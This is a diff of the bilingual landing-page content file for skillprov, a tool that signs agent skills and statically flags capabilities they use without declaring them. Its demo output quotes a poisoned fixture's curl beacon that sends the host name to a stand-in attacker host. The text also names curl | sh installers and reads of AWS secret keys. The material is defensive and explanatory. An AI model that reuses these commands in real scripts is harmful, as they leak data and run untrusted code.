@@ -1,97 +1,237 @@
 {
-  "schema": 1,
-  "content_version": "v0.6.0",
+  "schema": 3,
   "name": "skillprov",
   "github": "https://github.com/SuperMarioYL/skillprov",
   "host": "skillprov.lei6393.com",
-  "lang": { "primary": "zh", "toggle": true },
-  "accent": ["#E03131"],
+  "palette": "auto",
+  "lang": {
+    "primary": "zh",
+    "toggle": true
+  },
+  "meta": {
+    "visual_profile": "neon-particle",
+    "content_version": "0.6.0",
+    "demo_source": "docs/demo-results.json"
+  },
   "hero": {
     "eyebrow": {
-      "zh": "装之前先验签 · 声明比对实际代码 · 越权直接拒 · 全程离线",
-      "en": "Verify before install · Manifest checked against real code · Over-reach rejected · Fully offline"
+      "zh": "生成内容清单、签名与 SBOM，验证文件完整性，并找出静态扫描中未声明的能力。",
+      "en": "Generate manifests, signatures and SBOMs, verify file integrity and identify statically observed undeclared capabilities."
     },
     "headline": {
-      "zh": "声明一套、实际做另一套——\n装之前，让它先过一次能力验签",
-      "en": "Declares one thing, does another —\nmake it pass a capability check before you install"
+      "zh": "先检查 Skill 的内容与能力声明。",
+      "en": "Check skill content and capability claims."
     },
     "sub": {
-      "zh": "你从一个 skill 目录里 install 的第三方 skill，以完整的工具、网络与文件系统权限在你机器上跑起来——没有签名，也没人比对过它「声称能做什么」和「实际伸手做什么」。skillprov 在装之前先静态重扫这个 skill，把「声明能力」和「实际代码里观察到的能力」按值粒度做差集：偷偷 curl 远端、curl | sh 装器、读 $AWS_SECRET_ACCESS_KEY、把网络字段干脆省略想靠默认通过——任何一项越权都直接 REJECTED，带着文件行号退出码 1。一个 Go 单二进制，全程离线，无守护进程。",
-      "en": "The third-party skill you install from a directory runs with full tool, network, and filesystem permissions — unsigned, and nobody has compared what it claims to do against what it actually reaches for. skillprov statically re-scans the skill before install and diffs declared capabilities against the ones observed in the real code at value granularity: a hidden curl to a remote host, a curl | sh installer, a read of $AWS_SECRET_ACCESS_KEY, or a network field simply omitted to sneak through on a default — any one of them is REJECTED with file:line evidence and exit code 1. One Go binary, fully offline, no daemon."
+      "zh": "生成内容清单、签名与 SBOM，验证文件完整性，并找出静态扫描中未声明的能力。",
+      "en": "Generate manifests, signatures and SBOMs, verify file integrity and identify statically observed undeclared capabilities."
     },
-    "command": "skillprov verify ./skill-dir",
-    "cta": { "zh": "开始使用", "en": "Get started" },
-    "ctaGithub": { "zh": "在 GitHub 查看", "en": "View on GitHub" }
+    "href": "#quickstart",
+    "cta": {
+      "zh": "运行示例",
+      "en": "Run the example"
+    },
+    "ctaGithub": {
+      "zh": "查看源码",
+      "en": "View source"
+    }
+  },
+  "scene": {
+    "kind": "neon-graph",
+    "caption": {
+      "zh": "图示展示组件关系；实际输出见下方示例。",
+      "en": "An illustrative component scene; recorded output appears below."
+    },
+    "fallback": "/assets/presentation/scene-dark.svg",
+    "fallbackLight": "/assets/presentation/scene-light.svg"
   },
   "advantages": [
     {
-      "title": { "zh": "省略网络字段，再也不能默认通过", "en": "An omitted network field no longer slips through" },
-      "body": {
-        "zh": "只要把清单里的 `network` 字段整个省略，旧版本会当成「声明了网络」——于是它 curl 任何主机都验签通过。v0.4 关掉了这个默认真漏洞：只有真写了主机白名单才算声明网络；省略 = 不许联网，一联网就红。一份能偷偷 curl、却把网络字段声明缺省的清单，本身就是要拦的东西。",
-        "en": "Drop the `network` key from a manifest and the old verifier read it as 'declared network' — so the skill could curl any host and still pass. v0.4 closes that default-true loophole: network counts as declared only when a host allowlist is actually written; omitted means no network, and any net call turns red. A manifest that curls in secret while declaring nothing is exactly what this gate is for."
+      "title": {
+        "zh": "内容可核对",
+        "en": "Check the content"
       },
-      "chips": [
-        "› 省略不再等于声明",
-        "› 默认真漏洞已关闭",
-        "› 一联网就 REJECTED"
-      ]
+      "body": {
+        "zh": "修改、缺失和新增文件都参与内容检查。",
+        "en": "Changed, missing and added files participate in integrity checks."
+      }
     },
     {
-      "title": { "zh": "声明 git，却 curl | sh——被点名拒绝", "en": "Declares git, but pipes curl | sh — named and rejected" },
-      "body": {
-        "zh": "「声明了 commands: [git]」以前意味着可以偷偷 `curl https://x | sh` 还验签通过。v0.3 起 exec 命令也按值粒度做白名单：每一条观察到的外部命令都必须在声明清单里，残留的 `curl`、`sh` 会被逐个点名，连文件行号一起报红——供应链里最经典的 `curl | sh` 技巧就此失效。",
-        "en": "Declaring `commands: [git]` used to mean a quiet `curl https://x | sh` still verified green. Since v0.3 the exec allowlist is diffed at value granularity: every observed external command must appear in the declared set, and any residual `curl` or `sh` is named individually with its file:line and rejected — the classic `curl | sh` supply-chain trick stops here."
+      "title": {
+        "zh": "声明可比较",
+        "en": "Compare declarations"
       },
-      "chips": [
-        "› exec 命令按值白名单",
-        "› curl | sh 点名拒绝",
-        "› 带文件行号报红"
-      ]
+      "body": {
+        "zh": "把观察到的能力与声明放在一起。",
+        "en": "Compare observed capabilities with declared values."
+      }
     },
     {
-      "title": { "zh": "声明 api.github.com——`curl evil.host` 也拦得住", "en": "Declare api.github.com — `curl evil.host` is blocked too" },
-      "body": {
-        "zh": "声明一个主机白名单，不再留「省掉 https:// 就绕过」的暗门——`curl evil.host`（不带协议头）curl 会当成 http 真去访问，这类无协议主机也被抓出来比对、越界即红。环境变量白名单同理，而 shell 自带的 `$_`（上一条命令的最后一个参数）不再被误判成偷读环境变量：诚实使用 `$_` 的 skill 不再被冤枉报红，越界的那个主机、那个变量才被点名。声明了什么，就只许什么。",
-        "en": "Declaring a host allowlist leaves no 'drop the https:// and slip through' back door — `curl evil.host` (no scheme) is a real call curl treats as http, and such schemeless hosts are now captured and diffed, turning red the moment they're off the allowlist. The env-var allowlist works the same way, and the shell's own `$_` (the last argument of the previous command) is no longer misread as a sneaky env-var read: an honest skill using `$_` is no longer falsely rejected — only the off-allowlist host or variable gets named. What you declare is all that's allowed."
+      "title": {
+        "zh": "离线验证",
+        "en": "Verify offline"
       },
-      "chips": [
-        "› 无协议主机也逃不掉",
-        "› $_ 不再误报红",
-        "› 声明了什么就只许什么"
-      ]
-    },
-    {
-      "title": { "zh": "签名 + 内容锁，离线三十秒可审", "en": "Signature + content lock, offline and auditable in 30 seconds" },
       "body": {
-        "zh": "每份 skill 配一份可签名的能力清单和一份它实际包含什么的 SBOM。签名用本地 ed25519 私钥，全程离线、无服务端。验签时先重算每个文件的 sha256 内容锁、再校验签名——清单在签名后被改过一个字节，下一次验签就失败。一个 Go 单二进制，不挂后台、不联网取价，三十秒就能审完它会不会回传数据。",
-        "en": "Every skill ships with a signable capability manifest and an SBOM of what it actually contains. Signing uses a local ed25519 key, fully offline, no server. On verify it first recomputes every file's sha256 content lock, then checks the signature — a manifest altered by a single byte after signing fails the next verify. One Go binary, no background process, no network, auditable in thirty seconds."
-      },
-      "chips": [
-        "› ed25519 离线签名",
-        "› 内容锁一字节都不许改",
-        "› 三十秒可审"
-      ]
+        "zh": "本地密钥与文件足以运行示例。",
+        "en": "Local keys and files are sufficient for the demo."
+      }
     }
   ],
-  "scene": {
-    "kind": "hub-nodes",
-    "nodes": ["Hidden net call", "Default-true loophole", "curl | sh", "Reads your secrets"]
-  },
-  "cta": {
-    "headline": {
-      "zh": "装之前，先给 skill 验一次签",
-      "en": "Verify a skill before you install it"
+  "story": {
+    "intro": {
+      "title": {
+        "zh": "解决什么问题",
+        "en": "The task it solves"
+      },
+      "body": {
+        "zh": "第三方 Skill 往往带有脚本和文件操作说明。安装前需要检查发布的字节是否变化，以及脚本中的网络、环境变量和命令是否与声明一致。skillprov 将这些检查收进本地 CLI，返回可用于安装前检查或 CI 的结果。",
+        "en": "Third-party skills often include scripts and file-operation instructions. Before use, inspect whether published bytes changed and whether visible network, environment and command usage matches declarations. skillprov packages these checks into a local CLI suitable for pre-install checks or CI."
+      }
     },
-    "sub": {
-      "zh": "开源、Apache-2.0、无付费墙。给第三方 skill 加能力清单这件事，永不收费。",
-      "en": "Open source, Apache-2.0, no paywall. Giving a third-party skill a capability manifest is never gated."
-    },
-    "button": { "zh": "在 GitHub 上开始", "en": "Get started on GitHub" }
+    "sections": [
+      {
+        "title": {
+          "zh": "从输入到结果",
+          "en": "From input to result"
+        },
+        "body": {
+          "zh": "在临时目录里为自带 clean-skill 和 poisoned-skill 生成清单、签名并验证。签名与哈希是真实计算；毒化脚本只被读取。输出移除了 ANSI 样式字符。",
+          "en": "Generate manifests, sign and verify temporary copies of clean-skill and poisoned-skill. Signatures and hashes are real computations; poisoned scripts are only read. The script removes ANSI styling from displayed output."
+        },
+        "image": {
+          "light": "/assets/presentation/process-light.svg",
+          "dark": "/assets/presentation/process-dark.svg",
+          "alt": {
+            "zh": "在临时目录里为自带 clean-skill 和 poisoned-skill 生成清单、签名并验证。签名与哈希是真实计算；毒化脚本只被读取。输出移除了 ANSI 样式字符。",
+            "en": "Generate manifests, sign and verify temporary copies of clean-skill and poisoned-skill. Signatures and hashes are real computations; poisoned scripts are only read. The script removes ANSI styling from displayed output."
+          }
+        }
+      },
+      {
+        "title": {
+          "zh": "工作原理",
+          "en": "How it works"
+        },
+        "body": {
+          "zh": "scan 从 SKILL.md frontmatter 读取声明并扫描文件中的能力线索。manifest 保存 SHA-256 文件锁与声明，sbom 写 CycloneDX 子集；sign 生成 Ed25519 bundle。verify 重算文件集合、校验签名，再按能力类别与 host/env/exec 值比对。",
+          "en": "scan reads declarations from SKILL.md frontmatter and searches files for capability evidence. manifest saves SHA-256 file locks and declarations, while sbom emits a CycloneDX subset. sign produces an Ed25519 bundle. verify compares file sets, checks the signature and compares capability classes plus host/env/exec values."
+        },
+        "image": {
+          "light": "/assets/presentation/architecture-light.svg",
+          "dark": "/assets/presentation/architecture-dark.svg",
+          "alt": {
+            "zh": "scan 从 SKILL.md frontmatter 读取声明并扫描文件中的能力线索。manifest 保存 SHA-256 文件锁与声明，sbom 写 CycloneDX 子集；sign 生成 Ed25519 bundle。verify 重算文件集合、校验签名，再按能力类别与 host/env/exec 值比对。",
+            "en": "scan reads declarations from SKILL.md frontmatter and searches files for capability evidence. manifest saves SHA-256 file locks and declarations, while sbom emits a CycloneDX subset. sign produces an Ed25519 bundle. verify compares file sets, checks the signature and compares capability classes plus host/env/exec values."
+          }
+        }
+      },
+      {
+        "title": {
+          "zh": "能力与接入",
+          "en": "Capabilities and integration"
+        },
+        "body": {
+          "zh": "verify 可作为 CI 或安装前置命令；它不执行 Skill，也不在运行时限制网络或文件系统。主机、环境变量与 exec 命令支持值级声明；命令参数与混淆脚本仍超出当前静态检查能力。",
+          "en": "verify can be used in CI or before installation. It does not execute a skill or restrict network/filesystem access at runtime. Hosts, environment variables and exec commands support value-level declarations; command arguments and obfuscated scripts exceed current static checks."
+        },
+        "image": {
+          "light": "/assets/presentation/integrations-light.svg",
+          "dark": "/assets/presentation/integrations-dark.svg",
+          "alt": {
+            "zh": "verify 可作为 CI 或安装前置命令；它不执行 Skill，也不在运行时限制网络或文件系统。主机、环境变量与 exec 命令支持值级声明；命令参数与混淆脚本仍超出当前静态检查能力。",
+            "en": "verify can be used in CI or before installation. It does not execute a skill or restrict network/filesystem access at runtime. Hosts, environment variables and exec commands support value-level declarations; command arguments and obfuscated scripts exceed current static checks."
+          }
+        }
+      }
+    ],
+    "details": [
+      {
+        "title": {
+          "zh": "使用方式",
+          "en": "Usage"
+        },
+        "body": {
+          "zh": "verify 可作为 CI 或安装前置命令；它不执行 Skill，也不在运行时限制网络或文件系统。主机、环境变量与 exec 命令支持值级声明；命令参数与混淆脚本仍超出当前静态检查能力。",
+          "en": "verify can be used in CI or before installation. It does not execute a skill or restrict network/filesystem access at runtime. Hosts, environment variables and exec commands support value-level declarations; command arguments and obfuscated scripts exceed current static checks."
+        }
+      },
+      {
+        "title": {
+          "zh": "配置",
+          "en": "Configuration"
+        },
+        "body": {
+          "zh": "frontmatter 的 capabilities 可声明 net、fs-write、exec、env，以及 hosts、env-vars、commands。输出包括 capability-manifest.json、sbom.cdx.json、bundle.sig。生成的私钥应保存在 Skill 目录外并排除版本控制；扩大 allowlist 会改变验证含义。",
+          "en": "Frontmatter capabilities declare net, fs-write, exec and env with hosts, env-vars and commands. Outputs are capability-manifest.json, sbom.cdx.json and bundle.sig. Keep generated private keys outside the skill directory and out of version control. Broader allowlists change what verification establishes."
+        }
+      }
+    ]
   },
-  "footer": {
-    "tag": {
-      "zh": "给 agent skill 装的能力清单与验签闸门",
-      "en": "The capability manifest and verify gate for agent skills"
+  "demo": {
+    "title": {
+      "zh": "实际运行结果",
+      "en": "Actual demo output"
+    },
+    "note": {
+      "zh": "在临时目录里为自带 clean-skill 和 poisoned-skill 生成清单、签名并验证。签名与哈希是真实计算；毒化脚本只被读取。输出移除了 ANSI 样式字符。",
+      "en": "Generate manifests, sign and verify temporary copies of clean-skill and poisoned-skill. Signatures and hashes are real computations; poisoned scripts are only read. The script removes ANSI styling from displayed output."
+    },
+    "source": "https://github.com/SuperMarioYL/skillprov/blob/main/docs/demo-results.json",
+    "steps": [
+      {
+        "label": {
+          "zh": "签名后继续检查能力",
+          "en": "Check capabilities after signing"
+        },
+        "body": {
+          "zh": "两份清单都有有效签名，但含未声明能力的 fixture 仍被拒绝。",
+          "en": "Both manifests have valid signatures, but the fixture with undeclared capabilities is rejected."
+        },
+        "command": "python3 examples/presentation-demo.py",
+        "output": "verifying clean-skill\n  - digest: 2 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: observed set is a subset of declared\n\n PASS   signature valid, observed capabilities are a subset of declared\nexit_code: 0\nverifying poisoned-skill\n  - digest: 3 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: UNDECLARED capability detected\n\n REJECTED \n  ✗ undeclared capability \"env\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"exec\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\n  ✗ undeclared capability \"fs-write\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"net\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\nexit_code: 1\n",
+        "image": "/assets/presentation/demo-0-light.svg",
+        "imageDark": "/assets/presentation/demo-0-dark.svg"
+      }
+    ]
+  },
+  "quickstart": {
+    "title": {
+      "zh": "从完整输入开始",
+      "en": "Start with complete input"
+    },
+    "body": {
+      "zh": "需要 Go 1.24+。下方演示另外使用 Python 3 来复制临时 fixture 和检查预期退出码，绝不运行 fixture 中的脚本。",
+      "en": "Requires Go 1.24+. The example additionally uses Python 3 to copy temporary fixtures and check expected exit codes; it never runs fixture scripts."
+    },
+    "steps": [
+      {
+        "title": {
+          "zh": "安装",
+          "en": "Install"
+        },
+        "code": "git clone https://github.com/SuperMarioYL/skillprov.git\ncd skillprov\ngo build -o bin/skillprov ."
+      },
+      {
+        "title": {
+          "zh": "运行自带示例",
+          "en": "Run the supplied example"
+        },
+        "code": "python3 examples/presentation-demo.py"
+      }
+    ]
+  },
+  "limitations": [
+    {
+      "zh": "公钥随 bundle 提供，当前验证不自动建立发布者身份信任；签名有效不代表 Skill 安全。",
+      "en": "The public key travels in the bundle; current verification does not establish publisher identity trust. A valid signature does not establish skill safety."
+    },
+    {
+      "zh": "这是静态启发式检查，不是运行时沙箱；PASS 不能证明未检测到的行为不存在。",
+      "en": "This is static heuristic checking, not a runtime sandbox. PASS does not establish the absence of undetected behavior."
     }
-  }
+  ],
+  "footer": {
+    "tag": "0.6.0 · Go 1.24+ · Apache-2.0"
+  },
+  "content_version": "v0.6.0"
 }
